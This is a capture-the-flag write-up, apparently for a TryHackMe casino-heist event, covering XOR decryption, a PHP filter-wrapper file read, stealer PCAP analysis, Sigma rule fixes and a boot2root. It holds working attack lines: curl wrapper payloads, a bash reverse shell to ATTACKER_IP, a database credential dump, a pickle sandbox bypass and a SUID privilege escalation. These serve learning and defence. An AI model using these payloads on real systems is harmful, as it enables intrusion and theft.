@@ -1,0 +1,240 @@
+# Room Name - TryHackMe: Overflow The Jackpot CTF
+Date: 15 August 2026
+Difficulty: Various (Very Easy to Hard)
+Category: Crypto / Web / Forensics / Detection Engineering / Boot2Root
+
+# Scenario
+A Capture the Flag competition running from August 6 to 9 2026, themed around a casino heist at the Jackpot. Challenges spanned cryptography, web exploitation, network forensics, detection engineering via a Detection-as-Code pipeline, and a full boot2root engagement. The incident underpinning the detection engineering track involved POWDER WOLF, an eCrime cluster targeting hospitality infrastructure using stolen remote access credentials.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- Python 3 (pwntools, pycryptodome, pickle, hmac, struct, socket)
+- pyinstxtractor-ng
+- pydisasm
+- tshark / capinfos
+- nmap
+- gobuster
+- curl
+- netcat (nc)
+- SSH
+- WordPress admin panel
+- Splunk (index=dac_lab)
+- Detection-as-Code (DaC) pipeline interface
+- CyberChef
+- strings
+- file
+
+# What I Did
+
+**Challenge 1 — B1t Recovery (Crypto, Very Easy)**
+
+- Downloaded the attached zip and extracted the challenge files: encrypted.bin and challenge.py.
+- Reviewed challenge.py and confirmed the encryption used a 4-byte random XOR key applied repeatingly across the plaintext.
+- Exploited known-plaintext attack: since all TryHackMe flags begin with THM{, the first 4 bytes of the flag are known, allowing the key to be recovered directly:
+```python
+data = open('encrypted.bin','rb').read()
+known = b'THM{'
+key = bytes([data[i] ^ known[i] for i in range(4)])
+out = bytes([data[i] ^ key[i % 4] for i in range(len(data))])
+print(out)
+```
+- Recovered key: b'\xcb\xce\xceC'
+- Flag: `[redacted]`
+
+**Challenge 2 — Lost Fortune Included (Web, Easy)**
+
+- Connected to the target and identified a file viewer application accepting a doc parameter.
+- Tested standard path traversal — all attempts returned "Only .pdf and .png village documents may be viewed."
+- Tested PHP stream wrappers and confirmed the extension check was only applied to plain filenames, not to wrapper URIs:
+```
+curl -s "http://MACHINE_IP/?doc=php://filter/read=convert.base64-encode/resource=./index.php" | base64 -d
+```
+- Decoded the PHP source and confirmed wrappers bypassed the whitelist check entirely.
+- Used the wrapper to read the flag file directly:
+```
+curl -s "http://MACHINE_IP/?doc=php://filter/read=convert.base64-encode/resource=/var/www/flag.txt" | base64 -d
+```
+- Flag: `[redacted]`
+
+**Challenge 3 — Casino Heist (Forensics, Medium)**
+
+- Opened the provided PCAP (stolen_jackpot.pcapng) and identified two traffic streams: a large HTTP flow (20 MB) and two smaller TCP flows to port 4444.
+- Extracted the stealer binary downloaded via HTTP:
+```
+tshark -r stolen_jackpot.pcapng --export-objects http,http_objects
+```
+- Confirmed stealer was a PyInstaller-packed ELF binary.
+- Unpacked with pyinstxtractor-ng and disassembled the entry point .pyc with pydisasm.
+- Found hardcoded AES-CBC key and IV in the constants, and confirmed the malware walked /home for .jackpot files, encrypted them, and sent to 172.20.0.3:4444.
+- Extracted the exfiltrated ciphertext from the TCP stream and decrypted it:
+```python
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+KEY = b'J4ckp0tH4ck3rKey'
+IV  = b'Iv_For_Exf1ltr8!'
+data = bytes.fromhex("<stream hex>")
+nl = data.index(b'\n')
+ct = data[nl+1:]
+cipher = AES.new(KEY, AES.MODE_CBC, IV)
+print(unpad(cipher.decrypt(ct), 16))
+```
+- Flag: `[redacted]`
+
+**Challenge 4 — Fresh Powder (Detection Engineering, PRs 1-5)**
+
+Reviewed the POWDER WOLF incident report in the DaC threat-intel directory, then identified and fixed five broken Sigma detection rules through iterative testing against the Splunk lab (index=dac_lab), with red team bypass attempts after each fix.
+
+PR1 — External RDP Logon
+- Fixed: LogonType changed from string to integer, added LogonType 7 (session resume), corrected IP filter ranges to block internal ranges only, scoped VPN exemption to specific authorised users:
+```yaml
+detection:
+  selection:
+    EventID: 4624
+    LogonType:
+      - 10
+      - 7
+  filter_internal_rdp:
+    IpAddress|startswith: '10.40.'
+  filter_summitdesk:
+    IpAddress|startswith: '198.51.100.'
+    TargetUserName: 'svc_summitdesk_support'
+  filter_vpn_authorized:
+    IpAddress|startswith: '10.90.'
+    TargetUserName:
+      - 'r.doyle'
+      - 'k.nakamura'
+      - 'p.okonkwo'
+  condition: selection and not (filter_internal_rdp or filter_summitdesk or filter_vpn_authorized)
+```
+- Flag: `[redacted]`
+
+PR2 — NetScan Delete.me
+- Fixed: changed field from ShareName to RelativeTargetName, changed exact match to endswith to catch subdirectory placement:
+```yaml
+detection:
+  selection:
+    EventID: 5145
+    RelativeTargetName|endswith: 'delete.me'
+  condition: selection
+```
+- Flag: `[redacted]`
+
+PR3 — Remote Access Tool as Service
+- Fixed: changed logsource from security to system, changed field from Image to ServiceFileName, added ScreenConnect and TeamViewer coverage, added workstation filter:
+```yaml
+logsource:
+  product: windows
+  service: system
+detection:
+  selection:
+    EventID: 7045
+    ServiceFileName|contains:
+      - 'AnyDesk'
+      - 'ScreenConnect'
+      - 'TeamViewer'
+  filter_workstations:
+    ComputerName|startswith:
+      - 'SNW-PC'
+      - 'ALD-PC'
+      - 'TBL-PC'
+  condition: selection and not filter_workstations
+```
+- Flag: `[redacted]`
+
+PR4 — 7-Zip UNC Collection
+- Fixed: switched from Image to OriginalFileName to catch renamed binaries, added WinRAR coverage, added PowerShell Compress-Archive detection, added legitimate monthly archive filter:
+```yaml
+detection:
+  selection_archive_tools:
+    OriginalFileName:
+      - '7z.exe'
+      - '7zFM.exe'
+      - '7zG.exe'
+      - 'WinRAR.exe'
+      - 'Rar.exe'
+    CommandLine|contains: '\\\\'
+  selection_powershell:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains|all:
+      - 'Compress-Archive'
+      - '\\\\'
+  filter_monthly_archive:
+    ParentImage|endswith: '\wscript.exe'
+    CommandLine|contains: 'ReservationsExport_'
+  condition: (selection_archive_tools or selection_powershell) and not filter_monthly_archive
+```
+- Flag: `[redacted]`
+
+PR5 — Lynx Ransomware
+- Fixed: removed incorrect ParentImage and narrow CommandLine check, replaced with behavioural CommandLine pattern matching --dir and --mode fast flags, added legitimate DiskOptimizer filter:
+```yaml
+detection:
+  selection:
+    CommandLine|contains|all:
+      - '--dir'
+      - '--mode fast'
+  filter_diskoptimizer:
+    Image: 'C:\Program Files\ITOpsTools\DiskOptimizer.exe'
+    OriginalFileName: 'DiskOptimizer.exe'
+  condition: selection and not filter_diskoptimizer
+```
+- Flag: `[redacted]`
+
+**Challenge 5 — Agent P (Boot2Root, Hard)**
+
+Step 1 — WordPress exploitation for initial foothold
+- Identified WordPress 6.9 on the target.
+- Created an admin account and edited a theme PHP file to inject a reverse shell:
+```php
+<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
+```
+- Caught a shell as www-data.
+
+Step 2 — Database credential extraction for user escalation
+- Queried the WordPress database for infrastructure credentials:
+```bash
+php -r "\$c=new mysqli('localhost','wpuser','wp_WjURfdI','wordpress');\$r=\$c->query('SELECT * FROM wp_infra_accounts');\$row=\$r->fetch_assoc();print_r(\$row);"
+```
+- Found SSH credentials for user norm. SSHed in and retrieved the user flag.
+
+Step 3 — Internal panel discovery and pickle deserialization exploit
+- Found a Flask panel on 127.0.0.1:8700 and an operator secret in /etc/evilinc/panel.conf.
+- Authenticated to the panel API and discovered a blueprint import endpoint vulnerable to Python pickle deserialization.
+- Initial payload blocked on os module. Bypassed using pydoc.locate to reach os.system indirectly via raw pickle opcodes.
+- Executed commands as vanessa and injected an SSH public key into her authorized_keys.
+
+Step 4 — C2 HMAC forgery for root
+- Found a tasking socket at /run/evilinc/tasking.sock owned by vanessa's group.
+- Reversed the implant binary to identify a custom LCG keystream used to encrypt the signing key blob.
+- Recovered the signing key by decrypting the blob with the LCG keystream and deriving the HMAC key against /etc/machine-id.
+- Forged a signed SUBMIT task to execute chmod u+s /bin/bash:
+```python
+submit = f"SUBMIT {task_id}|exec|chmod u+s /bin/bash|1|{sig}"
+sock.send(submit.encode() + b"\n")
+```
+- Used the SUID bash to obtain a root shell and retrieved the root flag.
+
+# What I Found
+- B1t Recovery flag: `[redacted]`
+- Lost Fortune Included flag: `[redacted]`
+- Casino Heist flag: `[redacted]`
+- Fresh Powder PR1 flag: `[redacted]`
+- Fresh Powder PR2 flag: `[redacted]`
+- Fresh Powder PR3 flag: `[redacted]`
+- Fresh Powder PR4 flag: `[redacted]`
+- Fresh Powder PR5 flag: `[redacted]`
+- Agent P user flag: `[redacted]`
+- Agent P operator flag: `[redacted]`
+- Agent P root flag: `[redacted]`
+
+# Key Learning
+Known-plaintext XOR recovery is trivial when the key is short and any bytes of the plaintext are predictable, flag prefixes like THM{ are always sufficient to recover a 4-byte repeating key. PHP stream wrappers bypass extension-based file access controls because the wrapper protocol prefix prevents the extension check from matching, validating against a whitelist must occur after resolving the full resource path. PyInstaller binaries can be fully decompiled to recover hardcoded keys and logic using pyinstxtractor-ng and pydisasm, embedding credentials in a compiled binary provides no meaningful protection. Detection-as-Code pipelines require field-level precision: the wrong field name, wrong data type, or wrong log source category will silently cause a rule to produce no matches regardless of how correct the logic appears. Python pickle deserialization sandbox bypasses using indirect module access via pydoc.locate demonstrate that blocking specific module names is insufficient when the Python object model allows reaching the same functionality through multiple paths. Rolling your own HMAC signing scheme using a weak LCG keystream for key derivation is cryptographically broken, static seeds produce fully predictable keystreams that can be reversed with knowledge of the algorithm.
+
+# What I Would Flag in a Real SOC
+- XOR-encrypted files with a short repeating key are not meaningfully protected and should be treated as plaintext for investigative purposes, any data protection claim based on XOR alone must be rejected
+- PHP file inclusion endpoints that accept user-supplied paths must validate the resolved canonical path after expansion, not the raw input string, stream wrapper prefixes are a well-documented bypass for extension and path checks
+- Malware exfiltrating data over TCP with hardcoded AES keys embedded in the binary is detectable through binary analysis of any sample captured on the network, all outbound TCP flows from internal hosts to external IPs on non-standard ports should be captured and retained for post-incident analysis
+- Sigma rules with incorrect field names or data types will compile and deploy silently while matching zero events, all detection rules must be validated against representative log samples in a staging environment before production deployment
+- Python pickle deserialization of untrusted input is an RCE vulnerability regardless of module blocklists, the only safe approach is to avoid deserializing untrusted data entirely or to use a format-restricted alternative such as JSON
+- Custom cryptographic implementations using predictable keystreams for HMAC key derivation are trivially reversible, all production signing and authentication schemes must use cryptographically secure random key generation with keys stored in a hardware-backed secrets manager
